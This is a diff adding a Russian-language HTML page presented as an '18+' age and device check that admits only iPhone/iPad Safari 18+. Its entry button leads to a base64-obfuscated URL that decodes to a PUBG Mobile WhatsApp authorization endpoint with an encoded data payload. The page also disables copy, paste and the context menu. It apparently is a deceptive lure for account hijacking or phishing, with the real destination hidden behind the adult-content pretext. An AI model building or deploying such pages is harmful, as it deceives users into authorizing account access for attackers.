@@ -1,0 +1,265 @@
+<!doctype html>
+<html lang="ru">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>18+ Вход</title>
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="default">
+  <meta name="format-detection" content="telephone=no">
+  <style>
+    /* ===== Base ===== */
+    :root {
+      --bg0: #04060a;
+      --bg1: #0a0e1a;
+      --cyan: #00eaff;
+      --blue: #0099ff;
+      --blue2: #4f8cff;
+      --err: #ff5555;
+      --radius: 20px;
+    }
+    html, body { height: 100%; }
+    html { color-scheme: dark; }
+    body {
+      margin: 0; overflow: hidden; position: relative;
+      color: #fff; font-family: "Segoe UI", Roboto, system-ui, -apple-system, sans-serif;
+      display: grid; place-items: center;
+      background: radial-gradient(circle at center, var(--bg1) 0%, var(--bg0) 100%);
+      -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale;
+    }
+
+    /* ===== Animated gradient layer (GPU-friendly) ===== */
+    .animated-gradient {
+      position: absolute; inset: -10vmax; z-index: 0; pointer-events: none;
+      filter: blur(60px) saturate(120%);
+      background: conic-gradient(from 0deg,
+        rgba(0,153,255,.15), rgba(0,238,255,.08), rgba(79,140,255,.12), rgba(0,153,255,.15));
+      animation: swirl 24s linear infinite;
+    }
+    @keyframes swirl { to { transform: rotate(360deg); } }
+
+    /* Reduce motion accessibility */
+    @media (prefers-reduced-motion: reduce) {
+      .animated-gradient { animation: none; }
+    }
+
+    /* ===== Optional particles canvas (kept lightweight) ===== */
+    canvas#bg { position: absolute; inset: 0; z-index: 0; pointer-events: none; }
+
+    /* ===== Watermark ===== */
+    body::before {
+      content: "vskoll";
+      position: absolute; inset: 0; display: grid; place-items: center; z-index: 0;
+      font-size: 15vw; font-weight: 800; letter-spacing: .2em; text-transform: uppercase;
+      color: rgba(0, 153, 255, 0.05); filter: blur(2px); user-select: none; pointer-events: none;
+      transform: rotate(-10deg);
+    }
+
+    /* ===== Card ===== */
+    .card {
+      width: min(92vw, 460px);
+      padding: 28px; border-radius: var(--radius);
+      background: rgba(10, 15, 25, 0.85);
+      -webkit-backdrop-filter: blur(8px); backdrop-filter: blur(8px);
+      box-shadow: 0 0 25px rgba(0, 132, 255, 0.25), 0 0 80px rgba(0, 132, 255, 0.10) inset;
+      text-align: center; position: relative; z-index: 2;
+    }
+    h1 { font-size: 22px; font-weight: 700; margin: 0 0 12px; text-shadow: 0 0 10px var(--blue2), 0 0 20px rgba(79, 140, 255, .6); }
+    p { font-size: 15px; opacity: .88; margin: 0 0 20px; line-height: 1.5; }
+    .reason { font-size: 13px; margin-top: 8px; opacity: .8; text-shadow: 0 0 5px #001133; min-height: 1.5em; }
+    .notice { font-size: 12px; opacity: .65; margin-top: 14px; }
+
+    button {
+      width: 100%; height: 52px; border: none; border-radius: 12px;
+      background: linear-gradient(90deg, #0077ff, #00bfff);
+      color: #fff; font-weight: 700; font-size: 16px; letter-spacing: .5px; cursor: pointer;
+      transition: transform .15s ease, box-shadow .15s ease, filter .15s ease;
+      box-shadow: 0 0 15px rgba(0, 153, 255, .4);
+    }
+    button:hover { transform: translateY(-1px) scale(1.01); box-shadow: 0 0 25px rgba(0, 153, 255, .6); }
+    button:active { transform: scale(.98); box-shadow: 0 0 10px rgba(0, 153, 255, .8); }
+    .ok { color: var(--cyan); text-shadow: 0 0 8px var(--cyan); }
+    .err { color: var(--err); text-shadow: 0 0 6px var(--err); }
+  </style>
+</head>
+<body>
+  <!-- Animated visual layers -->
+  <div class="animated-gradient" aria-hidden="true"></div>
+  <canvas id="bg" aria-hidden="true"></canvas>
+
+  <div class="card" id="card">
+    <h1 id="title">Проверка устройства</h1>
+    <p id="text">Определение платформы…</p>
+    <div class="reason" id="reason"></div>
+    <button id="enterBtn" style="display:none;">Войти 18+</button>
+    <div class="notice" id="note"></div>
+  </div>
+
+  <script>
+    // ===== UX hardening (optional) =====
+    ['contextmenu','copy','cut','paste','dragstart','selectstart'].forEach(evt => {
+      window.addEventListener(evt, e => e.preventDefault(), { passive: false });
+    });
+
+    // ===== Target URL (base64) =====
+    const URL_PARTS = [
+      "aHR0cHM6Ly93d3cucHViZ21vYmlsZS5jb20vaWcvaXRvcC93aGF0c2FwcC9hdXRo",
+      "P3R5cGU9d2hhdHNhcHBhdXRoJmRhdGE9ZXlKYWRYTjBJam9nS2x3SWFTVnlaVzFo",
+      "YVhwbEluMHNJbWgwZEhCek9pOHhNVFV5T1RrM05EZzBOVGt3TUNJc0ltbGhjM05s",
+      "ZEhKbGMzUWlPaUpHVjJsMGFYWmxJaXdpWm1KallYUnBiMjRpT2lJd1dsaEtWbUZK",
+      "UlVGUFZrUkpVQSJ9"
+    ];
+    function decodeUrl(parts) {
+      try {
+        const b64 = parts.join('');
+        const bin = atob(b64);
+        const bytes = Uint8Array.from(bin, c => c.charCodeAt(0));
+        return new TextDecoder().decode(bytes);
+      } catch { return ''; }
+    }
+    function go() {
+      const target = decodeUrl(URL_PARTS);
+      if (!target) return;
+      location.assign(target);
+    }
+
+    // ===== Device / browser detection tuned for iOS & iPadOS Safari =====
+    const title  = document.getElementById('title');
+    const text   = document.getElementById('text');
+    const reason = document.getElementById('reason');
+    const btn    = document.getElementById('enterBtn');
+    const note   = document.getElementById('note');
+    btn.addEventListener('click', go);
+
+    function getIOSLikeVersion() {
+      // iOS & iPadOS Safari exposes like: "OS 18_0"; on Mac (iPadOS UA quirk) use appVersion
+      const ua = navigator.userAgent;
+      let m = ua.match(/OS\s(\d+)[_.]/); // iOS/iPadOS
+      if (m) return parseInt(m[1], 10);
+      m = navigator.appVersion && navigator.appVersion.match(/Version\/(\d+)/); // fallback
+      return m ? parseInt(m[1], 10) : null;
+    }
+
+    function isSafariWebKit() {
+      const ua = navigator.userAgent;
+      const vendorOK = navigator.vendor === 'Apple Computer, Inc.';
+      const isSafariToken = /Safari\//.test(ua) && !/Chrome|CriOS|Chromium|FxiOS|Edg|OPR/.test(ua);
+      return vendorOK && isSafariToken;
+    }
+
+    function isIOSFamily() {
+      const ua = navigator.userAgent;
+      const touchMac = navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1; // iPadOS 13+
+      const tokens = /(iPhone|iPad|iPod)/.test(ua);
+      return tokens || touchMac;
+    }
+
+    function isStandalonePWA() {
+      return window.matchMedia('(display-mode: standalone)').matches || window.navigator.standalone === true;
+    }
+
+    function trustScore() {
+      let score = 0;
+      if (isSafariWebKit()) score += 2.0;
+      if (isIOSFamily()) score += 2.0;
+      if (!('userAgentData' in navigator)) score += 0.5; // typical for Safari
+      if (isStandalonePWA()) score += 0.5;
+      return score; // pass threshold >= 3.5
+    }
+
+    (function main() {
+      const ver = getIOSLikeVersion();
+      const score = trustScore();
+      const isiOS = isIOSFamily();
+
+      const ok = isiOS && ver && ver >= 18 && score >= 3.5 && isSafariWebKit();
+      if (ok) {
+        title.textContent = 'Подтверждение 18+';
+        text.innerHTML = '<span class="ok">Доступ разрешён.</span>';
+        reason.textContent = `Обнаружено: ${/iPad|MacIntel/.test(navigator.platform) || /iPad/.test(navigator.userAgent) ? 'iPadOS' : 'iOS'} ${ver}, Safari WebKit.`;
+        btn.style.display = 'block';
+        note.textContent = 'Кнопка активна на оригинальных устройствах Apple (iOS/iPadOS 18+) в Safari.';
+      } else {
+        title.textContent = 'Доступ отклонён';
+        let r = '';
+        if (!isiOS) r = 'Устройство не относится к iOS/iPadOS.';
+        else if (!ver || ver < 18) r = 'Версия iOS/iPadOS ниже 18.';
+        else if (score < 3.5 || !isSafariWebKit()) r = 'Обнаружена подмена User-Agent/браузер не Safari.';
+        else r = 'Неизвестная ошибка.';
+        text.innerHTML = '<span class="err">Отказ в доступе.</span>';
+        reason.textContent = 'Причина: ' + r;
+        note.textContent = 'Доступ возможен только на iPhone/iPad с Safari 18+.';
+      }
+    })();
+
+    // ===== Animated particles (battery‑safe) =====
+    (function particles(){
+      const prefersReduce = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+      const canvas = document.getElementById('bg');
+      const ctx = canvas.getContext('2d', { alpha: true });
+      let dpr = Math.min(2, window.devicePixelRatio || 1);
+      let W, H, rafId, lastTs = 0;
+      const MAX_PARTICLES = prefersReduce ? 30 : 60;
+      const FPS = 48; // cap for iOS energy
+      const particles = [];
+
+      function resize() {
+        W = canvas.clientWidth = window.innerWidth;
+        H = canvas.clientHeight = window.innerHeight;
+        canvas.width = Math.floor(W * dpr);
+        canvas.height = Math.floor(H * dpr);
+        ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
+      }
+
+      function spawn() {
+        particles.length = 0;
+        for (let i = 0; i < MAX_PARTICLES; i++) {
+          particles.push({
+            x: Math.random() * W,
+            y: Math.random() * H,
+            r: 0.6 + Math.random() * 1.8,
+            a: Math.random() * Math.PI * 2,
+            s: 0.15 + Math.random() * 0.45, // speed
+            o: 0.06 + Math.random() * 0.14 // opacity
+          });
+        }
+      }
+
+      function step(ts) {
+        if (ts - lastTs < 1000 / FPS) { rafId = requestAnimationFrame(step); return; }
+        lastTs = ts;
+        ctx.clearRect(0, 0, W, H);
+        for (const p of particles) {
+          p.a += 0.002 + p.s * 0.002; // gentle drift
+          p.x += Math.cos(p.a) * p.s;
+          p.y += Math.sin(p.a) * p.s;
+          // wrap
+          if (p.x < -5) p.x = W + 5; else if (p.x > W + 5) p.x = -5;
+          if (p.y < -5) p.y = H + 5; else if (p.y > H + 5) p.y = -5;
+          ctx.beginPath();
+          ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
+          ctx.fillStyle = `rgba(0, 170, 255, ${p.o})`;
+          ctx.fill();
+          // soft glow
+          ctx.shadowBlur = 20; ctx.shadowColor = 'rgba(0,153,255,0.25)';
+          ctx.fill(); ctx.shadowBlur = 0;
+        }
+        rafId = requestAnimationFrame(step);
+      }
+
+      function start(){
+        if (prefersReduce) return; // leave only gradient for reduced motion
+        cancelAnimationFrame(rafId);
+        resize(); spawn();
+        rafId = requestAnimationFrame(step);
+      }
+      function stop(){ cancelAnimationFrame(rafId); }
+
+      window.addEventListener('resize', () => { dpr = Math.min(2, window.devicePixelRatio || 1); resize(); });
+      document.addEventListener('visibilitychange', () => { if (document.hidden) stop(); else start(); });
+
+      start();
+    })();
+  </script>
+</body>
+</html>
